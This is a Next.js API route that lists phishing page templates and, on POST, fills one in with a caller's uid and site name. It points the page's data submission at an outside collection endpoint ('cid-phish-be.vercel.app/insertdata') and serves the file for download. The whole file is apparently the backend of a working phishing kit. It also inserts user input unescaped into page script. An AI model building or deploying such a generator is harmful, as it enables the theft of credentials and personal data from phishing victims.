import { NextRequest, NextResponse } from 'next/server';
import { websites } from '@/constants';

export async function GET() {
  try {
    const templateNames = Object.keys(websites);
    
    return NextResponse.json({
      success: true,
      templates: templateNames,
      count: templateNames.length
    });
  } catch (error) {
    console.error('Error fetching templates:', error);
    return NextResponse.json(
      { 
        success: false, 
        error: 'Failed to fetch templates' 
      },
      { status: 500 }
    );
  }
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { templateName, uid, websiteName } = body;

    // Validate required fields
    if (!templateName || !uid || !websiteName) {
      return NextResponse.json(
        { 
          success: false, 
          error: 'Missing required fields: templateName, uid, or websiteName' 
        },
        { status: 400 }
      );
    }

    // Check if template exists
    if (!websites[templateName as keyof typeof websites]) {
      return NextResponse.json(
        { 
          success: false, 
          error: `Template '${templateName}' not found` 
        },
        { status: 404 }
      );
    }

    // Get the template HTML
    let htmlContent = websites[templateName as keyof typeof websites];

    // Replace the default uid and websiteName with the provided ones  "https://cid-phish-be.vercel.app/insertdata"
    htmlContent = htmlContent.replace(
      /const uid = "user123user123";/g, 
      `const uid = "${uid}";`
    );
    htmlContent = htmlContent.replace(
      /const websiteName = "mywebsitemywebsite";/g, 
      `const websiteName = "${websiteName}";`
    );
    htmlContent = htmlContent.replace(
      /http:\/\/localhost:5237\/insertdata/g,
      'https://cid-phish-be.vercel.app/insertdata'
    );

    // Create the response with the modified HTML
    const response = new NextResponse(htmlContent, {
      status: 200,
      headers: {
        'Content-Type': 'text/html',
        'Content-Disposition': `attachment; filename="${templateName}_${uid}.html"`
      }
    });

    return response;
  } catch (error) {
    console.error('Error processing template:', error);
    return NextResponse.json(
      { 
        success: false, 
        error: 'Failed to process template' 
      },
      { status: 500 }
    );
  }
}